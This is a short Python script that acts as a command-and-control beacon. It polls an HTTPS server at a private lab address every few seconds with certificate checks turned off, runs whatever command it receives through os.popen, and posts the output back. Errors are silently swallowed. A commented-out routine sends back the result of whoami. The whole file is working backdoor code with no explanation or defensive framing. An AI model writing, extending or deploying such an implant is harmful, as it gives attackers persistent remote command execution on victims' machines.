import os, ssl, time, http.client

# http.client.HTTPConnection('172.16.69.132:4443', timeout=10) => HTTP communication

"""
def first_time():
    try:
        first_connection = http.client.HTTPSConnection('172.16.69.130:4443', timeout=10, context=ssl._create_unverified_context())
        results = (os.popen(str("whoami")).read())
        first_connection.request("POST", "", results)
        first_connection.close()
    except:
        pass
"""


def callback():
    try:
        c2_connection = http.client.HTTPSConnection('172.16.69.130:4443', timeout=10, context=ssl._create_unverified_context())
        c2_connection.request("GET", "/")
        cmd = c2_connection.getresponse().read().decode()
        if cmd:
            results = (os.popen(str(cmd)).read())
            c2_connection.request("POST", "", results)
            c2_connection.close()
    except:
        pass


# first_time()


while 1:
    callback()
    time.sleep(5)
